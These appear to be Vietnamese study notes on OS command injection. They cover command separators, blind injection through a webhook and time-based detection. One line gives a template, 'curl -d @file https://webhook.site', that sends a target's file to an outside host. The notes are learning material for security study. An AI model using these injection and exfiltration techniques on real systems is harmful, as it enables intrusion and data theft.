# OS-Command-Injection
#### Có nhiều loại injection như code, command, query, html tag,.....
#### Nguyên lý của chủng lỗi Injection là:  #kéo dài - nối dài - nhét thêm
#### nó là nhưng câu lệnh tương tác với hệ điều hành, để hệ điều hành biết client muốn làm gì 
#### https://explainshell.com/ truy cập link để luyện tập các câu lệnh 
#### các thiết bị IoT (nhúng) thường rất dễ bị OS Command Injection và thường bị những lỗi rất giống nhau 
#### dùng tcp view để xem ứng dụng đang lắng nghe ports nào 
#### https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_03.html 
#### https://tldp.org/LDP/abs/html/special-chars.html 
#### https://www.gnu.org/software/bash/manual/html_node/Lists.html 
#### https://www.gnu.org/software/bash/manual/html_node/index.html#SEC_Contents 
#### https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html 
#### 4 tài liệu linux shell
### đặt biệt trong các tham số get,post là bị hiểu nhầm là đang truyền tham số đó chứ k phải là taget (&& là và trong linux)
### https://www.asciitable.com/ dùng new line (%0a) hoặc có thể nồng bằng cách $() hoặc ``  hoặc có thể dùng ; để ngắt câu lệnh và bắt đầu 1 câu lệnh mới 
# Blind-Command Injection 
#### dùng webhook 
#### xác định xem là website có sử dụng được lệnh curl hay k sau đó dùng %23(url encode là # dùng để comment ) để xóa hết phần phía sau đi 
#### sau đó dùng curl (hoặc wget) để gọi ra bên ngoài 
#### để dọi được file ra bên ngoài dùng curl -d @duong_dan_file https://webhook.site
# Time-Base
#### dùng thời gian (sleep để burte force) trong python thư viên request có elapsed
#### trong linux dấu blackslash (\) không có tác dụng 
